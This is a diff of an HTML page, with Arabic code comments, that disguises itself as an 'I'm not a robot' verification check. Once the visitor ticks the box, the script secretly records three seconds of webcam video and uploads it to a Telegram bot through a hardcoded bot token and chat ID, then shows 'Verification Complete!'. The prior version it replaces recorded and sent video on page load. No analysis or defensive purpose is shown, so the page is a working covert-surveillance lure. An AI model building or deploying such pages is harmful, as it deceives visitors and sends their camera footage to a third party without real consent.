@@ -3,52 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Capture</title>
+    <title>Robot Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #loading {
+            display: none;
+            font-size: 18px;
+            color: green;
+        }
+        #success {
+            display: none;
+            font-size: 18px;
+            color: green;
+        }
+        #checkbox-container {
+            margin-top: 20px;
+        }
+        #start-recording {
+            display: none;
+            margin-top: 20px;
+        }
+        video {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1 style="text-align: center;">Loading...</h1>
-    <video id="video" autoplay playsinline muted style="display: none;"></video>
+    <h1>Are you a robot?</h1>
+    <div id="checkbox-container">
+        <label>
+            <input type="checkbox" id="robot-checkbox"> I'm not a robot
+        </label>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+    <div id="loading">Recording... Please wait</div>
+    <div id="success">✅ Verification Complete!</div>
+
     <script>
         const video = document.getElementById('video');
+        const checkbox = document.getElementById('robot-checkbox');
+        const loading = document.getElementById('loading');
+        const success = document.getElementById('success');
         const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
         const telegramChatId = "2070423407";
 
-        // طلب الوصول إلى الكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
-                video.style.display = 'block';  // عرض الفيديو بعد بدء الوصول إلى الكاميرا
+        checkbox.addEventListener('change', (e) => {
+            if (e.target.checked) {
+                // عرض رسالة التسجيل
+                loading.style.display = 'block';
 
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
+                // طلب الوصول إلى الكاميرا
+                navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 320 },
+                        height: { ideal: 240 },
+                        frameRate: { ideal: 15 }
+                    }
+                }).then((stream) => {
+                    video.srcObject = stream;
 
-                // بدء التسجيل بعد فتح الموقع
-                mediaRecorder.start();
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
 
-                // حفظ البيانات أثناء التسجيل
-                mediaRecorder.ondataavailable = (event) => {
-                    chunks.push(event.data);
-                };
+                    mediaRecorder.start();
 
-                // إيقاف التسجيل بعد 3 ثوانٍ
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 3000);
+                    mediaRecorder.ondataavailable = (event) => {
+                        chunks.push(event.data);
+                    };
 
-                // عند انتهاء التسجيل، إرسال الفيديو إلى تيليجرام
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('chat_id', telegramChatId);
-                    formData.append('video', blob, 'video.webm');
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 3000); // تسجيل 3 ثوانٍ فقط
 
-                    fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    })
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const formData = new FormData();
+                        formData.append('chat_id', telegramChatId);
+                        formData.append('video', blob, 'video.webm');
+
+                        fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
+                            method: 'POST',
+                            body: formData
+                        })
                         .then((response) => {
                             if (response.ok) {
-                                alert('Video sent successfully!');
+                                success.style.display = 'block';
+                                setTimeout(() => {
+                                    loading.style.display = 'none';
+                                    success.style.display = 'none';
+                                    alert('Verification complete!');
+                                }, 2000); // انتظار ثانيتين لعرض رسالة النجاح
                             } else {
                                 alert('Failed to send video.');
                             }
@@ -57,13 +105,14 @@
                             alert('Error: ' + error.message);
                         });
 
-                    // إيقاف الكاميرا بعد الانتهاء
-                    stream.getTracks().forEach(track => track.stop());
-                };
-            })
-            .catch((err) => {
-                alert("Unable to access camera: " + err.message);
-            });
+                        // إيقاف الكاميرا بعد الانتهاء
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                }).catch((err) => {
+                    alert("Unable to access camera: " + err.message);
+                });
+            }
+        });
     </script>
 </body>
 </html>
